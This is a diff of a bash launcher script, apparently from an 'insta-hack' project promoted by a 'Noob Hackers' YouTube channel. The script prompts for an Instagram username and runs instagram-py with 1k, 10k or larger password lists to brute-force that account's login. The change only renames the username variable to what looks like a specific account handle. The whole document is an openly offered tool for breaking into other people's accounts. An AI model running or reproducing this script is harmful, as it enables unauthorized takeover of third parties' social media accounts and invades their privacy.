@@ -22,7 +22,7 @@ printf "\n"
 printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
 echo
-read -p "[#] User Name : " usrnm
+read -p "[#] User Name : " kanskiyy_700
 echo
 echo -e "$grn              [+]$red Type$ylo 1$red FOR 1k Passwords$grn
               [+]$red Type$ylo 2$red FOR 10K Passwords$grn
@@ -32,15 +32,15 @@ read -p "[#] Enter Selected Number: " marks
 echo 
 if [ $marks = 1 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/insta-hack/ig_brute_force/pass/pass1.txt 
+    instagram-py --username $kanskiyy_700 --password-list $HOME/insta-hack/ig_brute_force/pass/pass1.txt 
  
 elif [ $marks = 2 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/insta-hack/ig_brute_force/pass/pass2.txt
+    instagram-py --username $kanskiyy_700 --password-list $HOME/insta-hack/ig_brute_force/pass/pass2.txt
  
 elif [ $marks = 3 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/insta-hack/ig_brute_force/pass/pass3.txt
+    instagram-py --username $kanskiyy_700 --password-list $HOME/insta-hack/ig_brute_force/pass/pass3.txt
 else
 echo
 echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
